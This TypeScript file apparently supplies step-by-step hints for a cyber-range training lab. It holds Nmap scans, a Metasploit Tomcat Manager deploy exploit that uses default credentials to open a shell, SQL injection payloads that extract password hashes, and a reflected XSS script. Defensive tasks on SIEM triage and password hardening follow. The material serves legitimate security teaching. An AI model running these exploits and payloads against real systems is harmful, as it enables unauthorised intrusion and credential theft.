// Progressive, one-at-a-time hints for each scored task. The first hint is a
// nudge (what to try, no answer); later hints give the exact command or
// payload. Students reveal them one at a time so they can get unstuck without
// jumping straight to the full walkthrough or asking an instructor
// (SUS Q4 "need technical support", Q9 "felt confident", Q10 "learn a lot").
//
// Keyed "<catalogId>:<milestoneId>", e.g. "01:1", "09:0". Command text uses the
// same $TARGET_* placeholders as the guides; the UI swaps in this pod's real
// addresses. Copy is drawn from the command blocks in public/scenarios/*.md.

export type HintKind = "nudge" | "command" | "instruction";

export interface Hint {
  kind: HintKind;
  /** Nudge: a sentence. Command: lines to run/enter. Instruction: a concrete UI action. */
  text: string;
  /** Optional one-line note shown under a command hint. */
  note?: string;
}

function key(scenarioId: string, milestoneId: number): string {
  return `${scenarioId}:${milestoneId}`;
}

const HINTS: Record<string, Hint[]> = {
  // Scenario 1 — Network Reconnaissance & Exploitation (terminal, Kali)
  "01:1": [
    { kind: "nudge", text: "Discover which hosts respond in your assigned subnet — no port scan yet. Which Nmap flag does host discovery only?" },
    { kind: "command", text: "nmap -sn -n $TARGET_SUBNET", note: "Run in the Kali shell. -sn is discovery without a port scan; -n skips name resolution to keep it fast." },
  ],
  "01:2": [
    { kind: "nudge", text: "Scan meta for the specific ports this lab exposes (21, 22, 80, 8180). Use -p with a port list." },
    { kind: "command", text: "nmap -n -p 21,22,80,8180 $TARGET_META" },
  ],
  "01:3": [
    { kind: "nudge", text: "Add service/version detection to the same port scan of meta." },
    { kind: "command", text: "nmap -sV -n -p 21,22,80,8180 $TARGET_META", note: "-sV probes services for product and version; -n skips name resolution." },
  ],
  "01:4": [
    { kind: "nudge", text: "Use Metasploit's Tomcat Manager deploy module against meta on 8180 with the default tomcat / tomcat credentials, then open a shell. Keep the session open until the task is credited." },
    {
      kind: "command",
      text:
        "msfconsole -q\nuse exploit/multi/http/tomcat_mgr_deploy\nset RHOSTS $TARGET_META\nset RPORT 8180\nset HttpUsername tomcat\nset HttpPassword tomcat\nset PATH /manager/text\nset TARGET 1\nrun\nshell\nid",
      note: "Type the numeric meta address shown in the lab header — msfconsole does not expand $TARGET_META.",
    },
  ],
  "01:5": [
    { kind: "nudge", text: "Back in the normal Kali shell (exit the Metasploit session first), read the flag file and submit the printed token. A username is not a flag." },
    { kind: "command", text: "cat /opt/cyberrange/flags/scenario1.txt" },
  ],

  // Scenario 2 — SQL Injection & Reflected XSS (DVWA, browser). Set Security = Low first.
  "06:1": [
    { kind: "nudge", text: "In the User ID field, make the query always true so more than one user row comes back. A single quote closes the input's string." },
    { kind: "command", text: "1' OR '1'='1", note: "DVWA Security must be Low or it will not score." },
  ],
  "06:2": [
    { kind: "nudge", text: "UNION a second query onto the first. It must return two columns; put database() in one of them to print the database name." },
    { kind: "command", text: "1' UNION SELECT null, database() -- -" },
  ],
  "06:3": [
    { kind: "nudge", text: "UNION the user and password columns from the users table so the admin's hash appears in the result." },
    { kind: "command", text: "1' UNION SELECT user, password FROM users -- -", note: "Identify the admin row yourself; the 32-char hex value is the hash." },
  ],
  "06:4": [
    { kind: "nudge", text: "On the reflected-XSS page, put a <script> in the name field so the page runs it. The popup is your evidence it executed." },
    { kind: "command", text: "<script>alert(1)</script>" },
  ],
  "06:5": [
    { kind: "nudge", text: "Run the XSS, dismiss the popup, then scroll inside the DVWA result page to \"Your capture-the-flag code\" and submit that code in the Status area." },
    { kind: "instruction", text: 'After running the reflected XSS, dismiss the popup with OK. Scroll inside the DVWA result page to "Your capture-the-flag code:". Copy the displayed code into the flag field in Status and submit it.' },
  ],

  // Scenario 3 — SIEM Alert Triage (defensive). Generate from Kali, write files on meta.
  "09:0": [
    { kind: "nudge", text: "From Kali, generate one failed SSH login against meta, then open the SIEM and find your meta agent's rule 5710 event." },
    { kind: "command", text: "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 nosuchuser@$TARGET_META exit", note: "Click the individual 5710 event to copy its …Z timestamp for Task 2." },
  ],
  "09:1": [
    { kind: "nudge", text: "On the Target: meta (lab) tab, create the triage record from the guide skeleton. Use your own pod-…-meta agent, rule 5710, and the copied …Z time." },
    { kind: "command", text: "vi /home/msfadmin/alert_triage.json", note: "Replace every PASTE… line. Files written on Kali never score." },
  ],
  "09:2": [
    { kind: "nudge", text: "On meta, build the timeline from the guide skeleton and paste the copied rule 5710 …Z timestamp into the event line." },
    { kind: "command", text: "vi /home/msfadmin/incident_timeline.md", note: "Do not leave PASTE_SIEM_TIMESTAMP_Z or a literal HH:MM." },
  ],
  "09:3": [
    { kind: "nudge", text: "On meta, write the report: fill Summary, Affected system, Evidence, Interpretation, and Recommended response. It must exceed 200 bytes." },
    { kind: "command", text: "vi /home/msfadmin/incident_report.txt", note: "Include your agent name and rule 5710. One lab failure does not require blocking or isolation." },
  ],

  // Scenario 4 — Vulnerability Hardening (defensive). All work on the meta tab.
  "11:1": [
    { kind: "nudge", text: "On the meta tab, read Tomcat's users file (it needs sudo) and confirm the default tomcat / tomcat Manager credential is present." },
    { kind: "command", text: "sudo cat /etc/tomcat9/tomcat-users.xml" },
  ],
  "11:2": [
    { kind: "nudge", text: "Replace the default password in that file, restart Tomcat, confirm it is active, and check the old password is gone." },
    {
      kind: "command",
      text:
        "sudo sed -i 's/password=\"tomcat\"/password=\"Lab-Only-Secret-2026-Change-Me\"/' /etc/tomcat9/tomcat-users.xml\nsudo systemctl restart tomcat9\nsudo systemctl is-active tomcat9\nsudo grep -E \"password=[\\\"']tomcat[\\\"']\" /etc/tomcat9/tomcat-users.xml",
      note: "No output from the grep means the default password is gone.",
    },
  ],
  "11:3": [
    { kind: "nudge", text: "From meta, send one request to Tomcat Manager with the old tomcat / tomcat login and read the HTTP status code." },
    { kind: "command", text: "curl -s -o /dev/null -w '%{http_code}\\n' -u tomcat:tomcat http://127.0.0.1:8180/manager/text/list", note: "401 or 403 = rejected (done). 200 = still accepted; recheck Task 2. 000 = Tomcat not answering." },
  ],
};

export function hintsForTask(scenarioId: string, milestoneId: number): Hint[] {
  return HINTS[key(scenarioId, milestoneId)] ?? [];
}
